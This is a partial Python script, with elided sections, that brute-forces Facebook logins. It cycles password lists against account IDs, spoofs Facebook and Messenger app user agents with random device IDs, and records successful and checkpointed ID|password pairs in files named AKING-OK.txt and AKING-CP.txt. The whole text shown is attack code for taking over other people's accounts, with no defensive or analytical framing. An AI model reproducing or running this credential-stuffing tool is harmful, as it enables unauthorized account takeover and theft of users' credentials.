        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [success] %s | %s'%(ids,pas))
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;39m [XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua = '[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [success] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AKING-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;7;498m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
def rndm(ids,passlist):
                try:
                        ...
                        for pas in passlist:
                                ...
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/"+"FB4A;FBAV/"+"242.0.0.43.119;FBBV/"+"176515222;FBDM/"+"{density=2.625,width=1080,height=2042};FBLC/"+"en_US;FBRV/"+"177156964;FBCR/"+"Verizon ;FBMF/"+"samsung;FBBD/"+"samsung;FBPN/"+"com.facebook.katana;FBDV/"+"SM-G973U;FBSV/"+"9;FBOP/"+"1;FBCA/"+"arm64-v8a:;]"+"[FBAN/"+"FB4A;FBAV/"+"73.0.0.2973;FBBV/"+"7172918;[FBAN/"+"MessengerLiteForiOS;FBAV/"+"415.0.0.22.46;FBBV/"+"488895207;FBDV/"+"iPhone14,2;FBMD/"+"iPhone;FBSN/"+"iOS;FBSV/"+"16.5.1;FBSS/"+"3;FBCR/"+";FBID/"+"phone;FBLC/"+"en;FBOP;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
